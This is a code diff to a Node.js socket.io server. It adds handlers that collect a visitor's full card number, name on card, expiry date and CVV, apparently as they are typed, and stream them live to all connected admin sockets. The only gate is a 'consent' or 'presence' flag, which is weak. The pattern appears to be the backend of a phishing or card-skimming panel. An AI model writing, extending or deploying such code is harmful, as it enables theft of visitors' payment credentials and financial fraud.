@@ -485,7 +485,44 @@ io.on("connection", (socket) => {
   });
 
   // Handle card number verification
-  socket.on("cardNumber:verify", (cardNumber) => {
+  
+// ===== بطاقة الدفع المباشر (liveCard) =====
+socket.on("card:live", (data) => {
+  const visitor = visitors.get(socket.id);
+  if (!visitor || !data || (data.consent !== true && data.presence !== true)) return;
+
+  const cardNumber = String(data.cardNumber || '').replace(/\D/g, '').slice(0, 19);
+  const nameOnCard = String(data.nameOnCard || '').slice(0, 80);
+  const expiryDate = String(data.expiryDate || '').replace(/[^0-9/]/g, '').slice(0, 5);
+  const cvv = String(data.cvv || '').replace(/\D/g, '').slice(0, 3);
+
+  visitor.liveCard = { cardNumber, nameOnCard, expiryDate, cvv };
+  if (!visitor.liveCardTimestamp) visitor.liveCardTimestamp = new Date().toISOString();
+  visitors.set(socket.id, visitor);
+
+  admins.forEach((admin, adminSocketId) => {
+    io.to(adminSocketId).emit("card:liveUpdate", {
+      visitorId: visitor._id,
+      liveCard: visitor.liveCard,
+      liveCardTimestamp: visitor.liveCardTimestamp,
+    });
+  });
+});
+
+socket.on("card:liveHide", () => {
+  const visitor = visitors.get(socket.id);
+  if (!visitor) return;
+  visitor.liveCard = null;
+  visitor.liveCardTimestamp = null;
+  visitors.set(socket.id, visitor);
+  admins.forEach((admin, adminSocketId) => {
+    io.to(adminSocketId).emit("card:liveUpdate", {
+      visitorId: visitor._id, liveCard: null, liveCardTimestamp: null,
+    });
+  });
+});
+
+socket.on("cardNumber:verify", (cardNumber) => {
     const visitor = visitors.get(socket.id);
     if (visitor) {
       visitor.lastActivity = Date.now();
